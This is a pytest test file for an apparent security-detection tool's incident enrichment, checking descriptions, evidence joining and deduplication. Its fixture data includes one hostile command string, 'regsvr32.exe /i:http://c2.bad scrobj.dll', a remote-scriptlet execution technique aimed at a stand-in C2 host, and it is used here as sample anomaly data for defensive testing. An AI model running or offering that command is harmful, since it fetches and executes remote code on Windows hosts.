"""UI2a: incident creation enrichment — description + evidence from run anomalies."""

import json
from unittest.mock import patch

import pytest

from nabla.config import Settings


@pytest.fixture
def data_dir(tmp_path):
    (tmp_path / "runs.json").write_text(json.dumps([
        {"run_id": "run-12345678", "started_at": "2026-09-03T10:00:00Z", "anomalies": [
            {"entity": "root", "entity_type": "user", "severity": "high",
             "detection_method": "lolbin", "timestamp": "2026-09-03T10:01:00Z",
             "details": "regsvr32.exe /i:http://c2.bad scrobj.dll", "categories": [], "mitre_attack": []},
            {"entity": "root", "entity_type": "user", "severity": "critical",
             "detection_method": "critical_host_escalation", "timestamp": "2026-09-03T10:02:00Z",
             "details": "sudo on SERVER-DC01", "categories": [], "mitre_attack": []},
            {"entity": "other", "entity_type": "user", "severity": "low",
             "detection_method": "lolbin", "timestamp": "2026-09-03T10:03:00Z",
             "details": "unrelated", "categories": [], "mitre_attack": []},
        ]},
    ]))
    return tmp_path


def _settings(data_dir):
    return Settings(
        data_dir=str(data_dir), letta_base_url="http://localhost:9999",
        embedding_endpoint="http://localhost:11434/v1", splunk_host="",
        sumologic_host="", splunk_validate_url=False, sumologic_validate_url=False,
    )


def _run(finding, data_dir, supervisor=""):
    """save + list under an active settings patch."""
    from nabla.incidents import save_incidents, list_incidents
    with patch("nabla.config.get_settings", return_value=_settings(data_dir)), \
         patch("nabla.config._settings", _settings(data_dir)):
        n = save_incidents("run-12345678", [finding], supervisor_text=supervisor)
        incs = list_incidents(limit=5)
    return n, incs


FINDING = {
    "entity": "root", "entity_type": "user", "type": "lolbin",
    "severity": "high", "confidence": 0.85, "log_types": ["endpoint"],
    "mitre_attack": [{"id": "T1218", "name": "System Binary Proxy Execution"}],
    "cross_type": "single-type",
}


class TestCreationEnrichment:
    def test_description_populated(self, data_dir):
        n, incs = _run(FINDING, data_dir, supervisor="run narrative")
        assert n == 1
        inc = incs[0]
        assert "lolbin" in inc["description"].lower()
        assert "root" in inc["description"]
        assert "T1218" in inc["description"]

    def test_evidence_joined_from_run_anomalies(self, data_dir):
        n, incs = _run(FINDING, data_dir)
        inc = incs[0]
        ev = json.loads(inc["evidence"])
        assert ev["anomaly_count"] == 1  # only root+lolbin, not other-entity
        assert "regsvr32" in ev["anomalies"][0]["details"]

    def test_composite_type_joins_all_methods(self, data_dir):
        finding = dict(FINDING, type="critical_host_escalation, lolbin, pre_flagged")
        n, incs = _run(finding, data_dir)
        inc = incs[0]
        ev = json.loads(inc["evidence"])
        assert ev["anomaly_count"] == 2  # lolbin + critical_host_escalation for root

    def test_dedup_backfills_hollow_incident(self, data_dir):
        from nabla.incidents import save_incidents
        # Create a hollow incident (no description) then re-run same finding
        with patch("nabla.config.get_settings", return_value=_settings(data_dir)), \
             patch("nabla.config._settings", _settings(data_dir)):
            save_incidents("run-12345678", [FINDING])
            from nabla.incidents import list_incidents, save_incidents as si
            inc = list_incidents(limit=1)[0]
            inc.pop("description", None)
            inc.pop("evidence", None)
            import nabla.incidents as I
            path = str(data_dir / "incidents.json")
            I._save_incidents(path, [inc])
            si("run-12345678", [dict(FINDING, confidence=0.9)])
            inc2 = list_incidents(limit=1)[0]
            assert inc2["description"], "dedup should backfill description"
            assert json.loads(inc2["evidence"])["anomaly_count"] == 1

    def test_old_run_without_anomalies_degrades(self, tmp_path):
        (tmp_path / "runs.json").write_text(json.dumps([]))
        n, incs = _run(FINDING, tmp_path)
        inc = incs[0]
        assert inc["description"]  # description still populated (deterministic)
        assert not inc.get("evidence") or json.loads(inc["evidence"])["anomaly_count"] == 0
